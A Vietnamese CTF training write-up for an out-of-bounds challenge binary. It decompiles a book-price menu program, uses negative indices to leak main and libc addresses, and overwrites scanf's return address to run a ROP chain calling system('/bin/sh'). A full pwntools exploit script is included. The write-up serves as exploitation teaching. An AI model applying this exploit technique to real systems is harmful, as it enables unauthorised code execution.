---
title: 'KCSC Trainee Task 3: OUT OF BOUNDS EXPLOIT TECH'

---

# KCSC Trainee Task 3: OUT OF BOUNDS EXPLOIT TECH
![{7E5F1C1C-BDF3-4998-ADFE-2E318FB59C03}](https://hackmd.io/_uploads/Bky5ioC51l.png)

## IDA
- Tiến hành decompile chương trình ta phân tích hàm main:
```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  unsigned int buf; // [rsp+0h] [rbp-D0h] BYREF
  int idx; // [rsp+4h] [rbp-CCh] BYREF
  int fd; // [rsp+8h] [rbp-C8h]
  int choice; // [rsp+Ch] [rbp-C4h]
  void *ptr; // [rsp+10h] [rbp-C0h]
  void *Book; // [rsp+18h] [rbp-B8h]
  _QWORD book_list[10]; // [rsp+20h] [rbp-B0h] BYREF
  _QWORD v12[12]; // [rsp+70h] [rbp-60h] BYREF

  v12[11] = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  close(fd);
  srand(buf);
  gen_coeffs();
  enter_function();
  memset(book_list, 0, sizeof(book_list));
  memset(v12, 0, 80);
  idx = 0;
  do
  {
    while ( 1 )
    {
      while ( 1 )                               // Choice 2: with OOB can write something
      {
        while ( 1 )                             // Choice 1: Show info
        {
          while ( 1 )
          {
            choice = get_choice();
            if ( choice != 1 )
              break;
            printf("Enter your book idx: ");
            __isoc99_scanf("%d", &idx);
            printf("The price of the book in index %d is %lu\n", idx, book_list[idx]);
          }
          if ( choice != 2 )
            break;
          printf("Enter your book idx: ");
          __isoc99_scanf("%d", &idx);
          if ( idx > 10 )                       // OOB here
          {
LABEL_10:
            puts("OOB Access!");
          }
          else
          {
            printf("Enter price: ");
            __isoc99_scanf("%lu", &book_list[idx]);
          }
        }
        if ( choice != 3 )
          break;
        printf("Enter book idx: ");
        __isoc99_scanf("%d", &idx);
        if ( (unsigned int)idx >= 10 )
          goto LABEL_10;
        Book = malloc(0x100uLL);
        printf("Enter book: ");
        read(0, Book, 0x100uLL);
        v3 = sign(Book);
        v12[idx] = v3;
      }
      if ( choice != 4 )
        break;
      printf("Enter book idx: ");
      __isoc99_scanf("%d", &idx);
      if ( (unsigned int)idx <= 9 && v12[idx] )
      {
        ptr = (void *)verify_ptr(v12[idx]);
        free(ptr);
        v12[idx] = 0LL;
      }
      else
      {
        puts("OOB Access or invalid book.");
      }
    }
  }
  while ( choice != 5 );
  leave_function();
  return 0;
}
```
> Đầu tiên hàm tiến hành mở và đọc nội dung file /dev/urandom vào biến buf và đóng file, sử dụng biến buf để làm seed cho hàm rand() và lần lượt gọi hàm gen_coeffs() để tạo hệ số ngẫu nhiên và enter_function() để thiết lập giá trị bảo mật.
> 
> **Hàm gen_coeffs()**
> ```c=
> __int64 gen_coeffs()
> {
>   __int64 result; // rax
>   int i; // [rsp+Ch] [rbp-4h]
> 
>   coefs = (__int64)malloc(8 * coefs_len);
>   for ( i = 0; ; ++i )
>   {
>     result = coefs_len;
>     if ( i >= (unsigned __int64)coefs_len )
>       break;
>     *(_QWORD *)(coefs + 8LL * i) = rand() & 0xFFF;
>   }
>   return result;
> }
> ```
> > Tiến hành cấp phát bộ nhớ động dựa vào hệ số ngẫu nhiên coefs_len và sau đó cho mỗi phần tử trong bộ nhớ được cấp phát lưu trữ một giá trị bằng rand() & 0xfff và trả về giá trị của coefs_len. 
> > 
> **Hàm enter_function()**
> ```c=
> __int64 enter_function()
> {
>   __int64 vars0; // [rsp+10h] [rbp+0h]
> 
>   *(_QWORD *)(vars0 + 8) = sign(*(_QWORD *)(vars0 + 8));
>   return 0LL;
> }
> ```
> > Thay đổi giá trị tại vars0+8 thành giá trị trả về của hàm sign(vars0+8).
> > **Hàm sign()**
> > ```c=
> > __int64 __fastcall sign(__int64 a1)
> > {
> >   return (f(a1) << 48) | a1;
> > }
> > ```
> > > Trả về 16 bit cao của f(a1) và 48 bit thấp của a1.
> > >
> > **Hàm verify_ptr()**
> >```c=
> > __int64 __fastcall verify_ptr(__int64 a1)
> > {
> >   if ( !(unsigned int)verify(a1) )
> >   {
> >     printf("Memory corruption detected!");
> >     _exit(0);
> >   }
> >   return extract_ptr(a1);
> > }
> > ```
> > > Hàm sẽ dùng hàm verify() với tham số là tham số a1 của hàm để kiểm tra nếu không hợp lệ thì thoát chương trình còn hợp lệ thì trả về kết quả hàm extract_ptr() với tham số là a1.
> > >
> > **Hàm verify()**
> > ```c=
> > _BOOL8 __fastcall verify(unsigned __int64 a1, double a2, double a3)
> > {
> >   return f(a2, a3) == HIWORD(a1);
> > }
> > ```
> > > Trả về kết quả của thao tác kiểm tra xem kết quả của hàm f(a2,a3) có bằng giá trị của 16 bit cao của a1 hay không.
> > >
> > **Hàm f()**
> > ```c=
> > __int64 __fastcall f(double a1, double a2)
> > {
> >   __int64 v2; // rax
> >   int i; // [rsp+Ch] [rbp-Ch]
> >   __int64 v5; // [rsp+10h] [rbp-8h]
> >
> >   v5 = 0LL;
> >   for ( i = 0; i < (unsigned __int64)coefs_len; ++i )
> >   {
> >     a1 = pow(a1, a2);
> >     v5 += *(_QWORD *)(coefs + 8LL * i) * v2;
> >   }
> >   return (unsigned __int16)v5;
> > }
> > ```
> > > Lặp coefs_len lần, trong đó thực hiện việc gán a1 và kết quả của pow(a1,a2) và v5 là dãy số được cộng bởi biểu thức thương của các giá trị được random ra và giá trị của v2.
> > > Trả về là 16 bit thấp của v5.
> > >
> > **Hàm pow()**
> > ```c=
> > void __fastcall pow(double x, double y, __int64 a3, unsigned __int64 a4)
> > {
> >   int i; // [rsp+14h] [rbp-Ch]
> >   __int64 v5; // [rsp+18h] [rbp-8h]
> >
> >   v5 = 1LL;
> >   for ( i = 0; a4 > i; ++i )
> >     v5 *= a3;
> > }
> > ```
> > > Là hàm thực thi việc lũy thừa các tham số a3 và a4, kết quả được lưu vào v5 và bằng a3 mũ a4.
> > >
> > **Hàm extract_ptr()**
> > ```c=
> > __int64 __fastcall extract_ptr(__int64 a1)
> > {
> >   return a1 & 0xFFFFFFFFFFFFLL;
> > }
> > ```
> > > Trả về là giá trị của tham số a1 với 48 bit thấp. Đảm bảo địa chỉ hợp lệ.
> > > 
> **Hàm leave_function()**
> ```c=
> __int64 leave_function()
> {
>   __int64 result; // rax
>   __int64 vars0; // [rsp+10h] [rbp+0h]
> 
>   result = verify_ptr(*(_QWORD *)(vars0 + 8));
>   *(_QWORD *)(vars0 + 8) = result;
>   return result;
> }
> ```
> > Kiểm tra tính toàn vẹn của vars0+8 và sau đó trả về vars0+8.
> > 
> **Hàm set_return_ptr()**
> ```c=
> __int64 __fastcall set_return_ptr(__int64 a1)
> {
>   __int64 result; // rax
>   __int64 vars0; // [rsp+18h] [rbp+0h]
> 
>   result = vars0 + 8;
>   *(_QWORD *)(vars0 + 8) = a1;
>   return result;
> }
> ```
> > Cập nhật giá trị của vars0+8 là a1 và trả về vars0+8 ban đầu. Dùng để thiết lập con trỏ trả về.
> > 
> **Hàm get_choice**
> ```c=
> __int64 get_choice()
> {
>   unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
>   unsigned __int64 v2; // [rsp+8h] [rbp-8h]
> 
>   v2 = __readfsqword(0x28u);
>   v1 = 0;
>   puts("\n1. Get book price");
>   puts("2. Set book price");
>   puts("3. Add book");
>   puts("4. Delete book");
>   puts("5. Exit");
>   printf("> ");
>   __isoc99_scanf("%d", &v1);
>   return v1;
> }
> ```
> > In ra menu các tùy chọn và thực hiện lấy tùy chọn của người dùng.
> > 
> Sau đó thực hiện thiết lập kích kích thước cho biến booklist và v12.
> Tiếp theo là chuỗi các lựa chọn được lồng trong các vòng lặp while và do-while lồng vào nhau:
> Bắt đầu bằng gọi hàm get_choice() cho phép ta nhập lựa chọn và theo menu có sẵn
> + Lựa chọn 1: Cho phép ta nhập vào index của sách và sau đó xuất ra màn hình giá trị của quyển sách có index tương ứng.
> + Lựa chọn 2: Cho phép ta nhập vào index và thay đổi giá trị của sách có index tương ứng và thực hiện kiểm tra nếu index có lớn hơn 10 thì sẽ thông báo rằng đã truy cập ngoài vùng cho phép.
> + Lựa chọn 3: Cho phép ta nhập vào index và thực hiện kiểm tra nếu index lớn hơn hoặc bằng 10 thì thực thi in ra chuỗi tại label 10 (là đã truy cập ngoài vùng cho phép) và sau đó nếu hợp lệ thì thực thi việc cấp phát động một vùng nhớ heap để lưu trữ nội dung và cho phép ta nhập vào nội dung của của cuốn sách ta muốn tạo thông qua con trỏ là Book. Sau đó gán v3 là giá trị trả về của hàm sign(Book) và gán giá trị đó cho tủ sách v12 ở quyển có index tương ứng. Vậy v12[index] lúc này đang lưu trữ con trỏ trỏ đến nội dung cuốn sách.
> + Lựa chọn 4: Cho phép ta nhập vào index của cuốn sách ta muốn xóa và kiểm tra tính hợp lệ của index, sau đó tiến hành kiểm tra tính hợp lệ của con trỏ của sách với index tương ứng và thực hiện giải phóng bộ nhớ đã cấp phát lưu trữ nội dung của sách đồng thời cũng đặt lại giá trị trên tủ sách về cuống sách đó về 0.
> + Lựa chọn 5: Gọi hàm leave_function() và kết thúc chương trình.

## Ý TƯỞNG
- Ta nhận thấy rằng có thể sử dụng lỗi Out Of Bounds tại lựa chọn 1 và lựa chọn 2 vì lựa chọn 1 không thực hiện kiểm tra xem vùng nhớ ta sử dụng idx để truy cập có hợp leeh hay không; lựa chọn 2 chỉ kiểm tra lớn hơn 10 nên nếu ta nhập một số âm thì vẫn có thể vượt qua được kiểm tra.
- Vậy ta sẽ sử dụng lựa chọn 1 để leak những thông tin cần thiết và lựa chọn 2 để ghi đè địa chỉ nào đó.

## KHAI THÁC
- Checksec
> Kiểm tra các phương thức bảo mật:
> ![{8F6529B7-3E3D-4984-B979-4A13F36406F2}](https://hackmd.io/_uploads/B1GM40Rqkx.png)
> Vậy hầu như các phương pháp bảo mật được bật. Ta không thể thực hiện việc sử dụng lựa chọn 2 để ghi đè lên bảng GOT (GOT Attack) và cũng không thể nào có thể ghi đè địa chỉ trả về của main để thực thi ROPChain.
- Leak address
> Ta sẽ tiến hành khảo sát stack trước lúc lựa chọn 1 in ra thông tin:
![{D8F91B3D-9E91-43B2-B433-A2A48CDE380D}](https://hackmd.io/_uploads/HJjfj0Rc1e.png)
> Ta khảo sát bằng idx = -1
> Dừng tại trước khi in ra thông tin thì ta thấy rằng dữ liệu tại idx -1 được in ra sẽ được đưa vào thanh ghi rdx. Vậy vì sao là rdx? Ta cùng xem lại các bước trước khi đến printf:
> ![{7DEBF687-F117-4A75-8ACC-21B36C8BC4E4}](https://hackmd.io/_uploads/Sy7Z3ARqJg.png)
> Tại đây ta thấy rằng thanh ghi rdx được gán với một giá trị tại địa chỉ được tính toán bởi [rbp+rax*8-0xb0] và tương đương với lại địa chỉ stack 0x7fffffffdd78 và tại địa chỉ này đang lưu trữ giá trị 0.
>  Vậy dựa vào công thức tính toán trên, ta thấy rằng rax đang lưu trữ giá trị của index ta nhập vào và tương tự như vậy nếu ta nhập vào index là -2 thì địa chỉ stack trong rdx lúc này sẽ bằng địa chỉ của index = 1 - 8. 
>  Vậy ta hoàn toàn có thể leak được các địa chỉ ở các index có giá trị âm khác và ta cùng khảo sát từ rsp trở lên:
> ![{634EF47A-C42E-4FA7-AC8F-9FB2389B8B09}](https://hackmd.io/_uploads/rk4CR00cyg.png)
> Từ đây ta có thể thấy tồn tại địa chỉ main tại địa chỉ 0x7fffffffdd28 và địa chỉ libc tại 0x7fffffffdd00. Vậy ta sẽ thực thi leak 2 địa chỉ này và tính toán cho ra địa chỉ exe base và libc base. Ta có script:
> ```
> # Use oob at choice 1 can leak main address (idx: -11) and libc address (idx: -16)
> sla(b'> ',b'1')
> sla(b'idx: ',b'-11')
> ru(b'index -11 is ')
> main = int(rl())
> info("Main leak: "+hex(main))
> exe.address = main - 0x1682
> 
> sla(b'> ',b'1')
> sla(b'idx: ',b'-16')
> ru(b'index -16 is ')
> libc_leak = int(rl())
> info("Libc leak: "+hex(libc_leak))
> libc.address = libc_leak - 0x29d90 
> 
> info("Exe base: "+hex(exe.address))
> info("Libc base: "+hex(libc.address))
> ```
> Ta cho chạy thử script và ta kiểm tra xem các địa chỉ đã được leak ra đúng chưa:
> ![{B95C0E9B-7D96-477A-8383-84AF40BDCAAE}](https://hackmd.io/_uploads/HJxNW1JoJx.png)
> Vậy các địa chỉ đều trùng khớp.
- Cooking shell =)))
> Như ở bước checksec, các phương án đều không khả thi và hiện tại điều chúng ta có thể làm là ghi đè địa chỉ nào đó trên stack thông qua lựa chọn 2. 
> Vì vậy ta sẽ đi khảo sát sâu hơn vào các hàm nhỏ như scanf:
> ![{5E296D91-7FE5-4A27-9EA3-434265EDEB02}](https://hackmd.io/_uploads/Hki0jNgjJg.png)
> Như vậy ta nhận thấy rằng các hàm như scanf đều có các lệnh thực hiện nhỏ hơn và cũng hoạt động và trả về như những hàm khác và điều đặc biệt ở đây là tại scanf return, rsp đang trỏ đến một địa chỉ trên stack và tại đó đang lưu trữ địa chỉ trả về của scanf là main+547. 
> Và khi ta khảo sát bằng lựa chọn 2 và index = -1 thì ta được stack:
> ![{43732774-75E8-4CB3-BF83-48AB27C1470D}](https://hackmd.io/_uploads/HJ7xJrlsJx.png)
> Với index = -1 thì địa chỉ stack được tính toán là 0x7fffffffdd98 và so với địa chỉ rsp của scanf là 0x7fffffffdd78 thì ta nhận thấy ta có thể tiếp cận với return address của scanf bằng index -5.
> Tuy nhiên tại đây scanf đang có định dạng là một số nên ta chỉ được phép nhập một địa chỉ dưới dạng số nguyên.
> Vậy đến đây ta sẽ xác định hướng khai thác là sử dụng kĩ thuật ROPchain để khai thác bằng gdaget để điều khiển thanh ghi rdi với chuỗi "/bin/sh" và gọi hàm system để thực thi.
> Ta có script đơn giản:
> ```
> binsh = next(libc.search("/bin/sh\0"))
> # sla(b'> ',b'2')
> # sla(b'idx: ',b'-2') # #idx = (adr[idx=0] - adr[adx=n])/8
> # sla(b'Enter price: ',f'{ret}'.encode())
> 
> sla(b'> ',b'2')
> sla(b'idx: ',b'-4')
> sla(b'Enter price: ',f'{prdi}'.encode())
> 
> sla(b'> ',b'2')
> sla(b'idx: ',b'-3')
> sla(b'Enter price: ',f'{binsh}'.encode())
> 
> sla(b'> ',b'2')
> sla(b'idx: ',b'-2')
> sla(b'Enter price: ',f'{libc.sym.system}'.encode())
> ```
> Với địa chỉ binary và địa chỉ libc đã được leak thì việc gọi hàm và và tìm kiễm chuỗi trên stack là đơn giản. Tuy nhiên ta vướng phải một vấn đề ở đây là nếu ta ghi trực tiếp những gadget trên ở ngay dưới index -5 lần lượt là [-4; -3; -2] thì tại -4 và -3 sẽ bị các giá trị của scanf ghi đè vào dữ liệu:
> ![{48EDCD74-4B96-4025-ABD5-F242D9F6C20B}](https://hackmd.io/_uploads/SkqTyLZoyg.png)
> Nên ta buộc phải lui index xuống là [-2; -1; 0] và vấn đề gặp phải là scanf return không ret trực tiếp vào vùng dữ liệu ta đã ghi.
> ![{59D2785A-EC07-4F2B-9CC2-BBEF0E52F69F}](https://hackmd.io/_uploads/S1rSlIbj1l.png)
> Vậy vấn đề cuối cùng ta giải quyết sẽ là làm sao để scanf ret vào nơi ta ghi dữ liệu và vì chỉ được nhập số nên ta sẽ nhập vào địa chỉ của một gadget thích hợp để làm điều đó.
> Sau một hồi tìm kiếm (thanks to A WAN=))) thì ta tìm được gadget để loại bỏ được 2 giá trị đó là pop rcx; pop rbx vì khi thực thi sẽ tiến hành đẩy 2 giá trị dư kia vào thanh ghi rcx và rbx và rsp lúc này sẽ trỏ trực tiếp đến lệnh mà ta đã ghi vào trước đó. Ta có script:
> ```python= 
> #get_shell = p64(ret) + p64(prdi) + p64(next(libc.seacrh("/bin/sh\0"))) + p64(libc.sym.system)
> binsh = next(libc.search("/bin/sh\0"))
> # sla(b'> ',b'2')
> # sla(b'idx: ',b'-2') # #idx = (adr[idx=0] - adr[adx=n])/8
> # sla(b'Enter price: ',f'{ret}'.encode())
> 
> sla(b'> ',b'2')
> sla(b'idx: ',b'-2')
> sla(b'Enter price: ',f'{prdi}'.encode())
> 
> sla(b'> ',b'2')
> sla(b'idx: ',b'-1')
> sla(b'Enter price: ',f'{binsh}'.encode())
> 
> sla(b'> ',b'2')
> sla(b'idx: ',b'0')
> sla(b'Enter price: ',f'{libc.sym.system}'.encode())
> 
> scanf ret controlling
> sla(b'> ',b'2')
> sla(b'idx: ',b'-5')
> sla(b'Enter price: ',f'{prcx_rbx}'.encode())
> ```
- Ta tiến hành cho chạy thử script:
![{C479F687-62B1-47C4-9E6C-873406522746}](https://hackmd.io/_uploads/SySC-IbsJl.png)
- Vậy ta đã có được shell

=> **Challenge hoàn thành**

## FULLSCRIPT
```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF('pacipac_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+368
        b*main+542
        b*main+433
        b*scanf+198 
        b*main+628
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:   
    p = process([exe.path])
GDB()
# [rax*8 + rdx]
# Use oob at choice 1 can leak main address (idx: -11) and libc address (idx: -16) rbp leak (idx: -6)
sla(b'> ',b'1')
sla(b'idx: ',b'-11')
ru(b'index -11 is ')
main = int(rl())
info("Main leak: "+hex(main))
exe.address = main - 0x1682

sla(b'> ',b'1')
sla(b'idx: ',b'-16')
ru(b'index -16 is ')
libc_leak = int(rl())
info("Libc leak: "+hex(libc_leak))
libc.address = libc_leak - 0x29d90 

sla(b'> ',b'1')
sla(b'idx: ',b'-6')
ru(b'index -6 is ')
rbp = int(rl())
info("RBP leak: "+hex(rbp))

info("Exe base: "+hex(exe.address))
info("Libc base: "+hex(libc.address))


# Get shell
#Invest the scanf func, it will ret to the addr on stack at 0x7fffffffdd78 and it is idx -5
#So we'll ovww it by a addr of gadget
syscall = libc.address +0x29db4
prdi = libc.address + 0x2a3e5
prsi = libc.address + 0x2be51
ret = libc.address + 0x29139 
one = libc.address + 0xebc88
prcx_rbx = libc.address + 0x108b04

#get_shell = p64(ret) + p64(prsi) + p64(0) + p64(one)
# sla(b'> ',b'2')
# sla(b'idx: ',b'--2') # #idx = (adr[idx=0] - adr[adx=n])/8
# sla(b'Enter price: ',f'{ret}'.encode())

# sla(b'> ',b'2')
# sla(b'idx: ',b'-2')
# sla(b'Enter price: ',f'{prsi}'.encode())

# sla(b'> ',b'2')
# sla(b'idx: ',b'-1')
# sla(b'Enter price: ',f'{0}'.encode())

# sla(b'> ',b'2')
# sla(b'idx: ',b'0')
# sla(b'Enter price: ',f'{one}'.encode())

#scanf ret controlling
# sla(b'> ',b'2')
# sla(b'idx: ',b'-5')
# sla(b'Enter price: ',f'{prcx_rbx}'.encode())

#get_shell = p64(ret) + p64(prdi) + p64(next(libc.seacrh("/bin/sh\0"))) + p64(libc.sym.system)
binsh = next(libc.search("/bin/sh\0"))
# sla(b'> ',b'2')
# sla(b'idx: ',b'-2') # #idx = (adr[idx=0] - adr[adx=n])/8
# sla(b'Enter price: ',f'{ret}'.encode())

sla(b'> ',b'2')
sla(b'idx: ',b'-2')
sla(b'Enter price: ',f'{prdi}'.encode())

sla(b'> ',b'2')
sla(b'idx: ',b'-1')
sla(b'Enter price: ',f'{binsh}'.encode())

sla(b'> ',b'2')
sla(b'idx: ',b'0')
sla(b'Enter price: ',f'{libc.sym.system}'.encode())

#scanf ret controlling
sla(b'> ',b'2')
sla(b'idx: ',b'-5')
sla(b'Enter price: ',f'{prcx_rbx}'.encode())

p.interactive()
```
